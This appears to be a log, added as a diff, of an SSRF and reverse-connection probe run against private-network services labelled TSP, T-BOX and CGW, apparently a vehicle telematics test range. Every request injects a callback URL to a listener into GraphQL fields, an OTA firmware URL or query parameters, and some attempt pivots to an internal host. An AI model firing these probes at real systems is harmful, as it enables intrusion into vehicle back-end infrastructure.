@@ -1,0 +1,66 @@
+# SSRF/reverse-connection battery  2026-11-14T10:06:42+08:00
+# callback listener: 10.252.3.20:9999 (only local bind; no influence on range)
+
+## TSP 10.225.139.2:8080
+--- POST /graphql body={"query":"{ vehicles { label vin } }","variables":{"url":"http://10.252.3.20:9999/a"}}
+  http=200 t=0.075352
+--- POST /graphql body={"query":"{ url }"}
+  http=200 t=0.052374
+--- POST /graphql body={"query":"mutation { fetch(url: \"http://10.252.3.20:9999/b\") }"}
+  http=200 t=0.052456
+--- POST /graphql body={"query":"{ ota(firmwareUrl:\"http://10.252.3.20:9999/c\"){id} }"}
+  http=200 t=0.075158
+--- POST /graphql body={"url":"http://10.252.3.20:9999/d"}
+  http=200 t=0.053238
+--- POST /graphql body={"callback":"http://10.252.3.20:9999/e"}
+  http=200 t=0.054672
+--- GET /fetch?url=http://10.252.3.20:9999/ssrf/f1
+  http=404 t=0.051923
+--- GET /proxy?url=http://10.252.3.20:9999/ssrf/p1
+  http=404 t=0.051824
+--- GET /download?url=http://10.252.3.20:9999/ssrf/d1
+  http=404 t=0.051481
+--- GET /ota?url=http://10.252.3.20:9999/ssrf/o1
+  http=404 t=0.052269
+--- GET /api/ota?url=http://10.252.3.20:9999/ssrf/o2
+  http=404 t=0.053814
+--- GET /api/proxy?url=http://10.252.3.20:9999/ssrf/p2
+  http=404 t=0.053496
+--- GET /redirect?url=http://10.252.3.20:9999/ssrf/r1
+  http=404 t=0.053907
+--- GET /healthz?url=http://10.252.3.20:9999/ssrf/h1
+  http=200 t=0.053209
+
+## T-BOX 10.225.139.3:8080
+--- GET /fetch?url=http://10.252.3.20:9999/ssrf/t1
+  http=404 t=0.056028
+--- GET /proxy?url=http://10.252.3.20:9999/ssrf/t2
+  http=404 t=0.051492
+--- GET /ota?url=http://10.252.3.20:9999/ssrf/t3
+  http=404 t=0.052943
+--- GET /api/ota?url=http://10.252.3.20:9999/ssrf/t4
+  http=404 t=0.052037
+--- GET /download?url=http://10.252.3.20:9999/ssrf/t5
+  http=404 t=0.052827
+
+## CGW 10.226.193.2:8080 + 10.225.139.4:8080
+--- GET 10.226.193.2/fetch?url=http://10.252.3.20:9999/ssrf/c1
+  http=404 t=0.064563
+--- GET 10.226.193.2/proxy?url=http://10.252.3.20:9999/ssrf/c2
+  http=404 t=0.072766
+--- GET 10.226.193.2/healthz?url=http://10.252.3.20:9999/ssrf/c3
+  http=200 t=0.074265
+--- GET 10.226.193.2/can?ip=10.226.197.5&port=8080
+  http=404 t=0.073825
+--- GET 10.226.193.2/bridge?target=10.226.197.5:8080
+  http=404 t=0.052278
+--- GET 10.225.139.4/fetch?url=http://10.252.3.20:9999/ssrf/c1
+  http=404 t=0.052868
+--- GET 10.225.139.4/proxy?url=http://10.252.3.20:9999/ssrf/c2
+  http=404 t=0.052662
+--- GET 10.225.139.4/healthz?url=http://10.252.3.20:9999/ssrf/c3
+  http=200 t=0.052569
+--- GET 10.225.139.4/can?ip=10.226.197.5&port=8080
+  http=404 t=0.055024
+--- GET 10.225.139.4/bridge?target=10.226.197.5:8080
+  http=404 t=0.051528
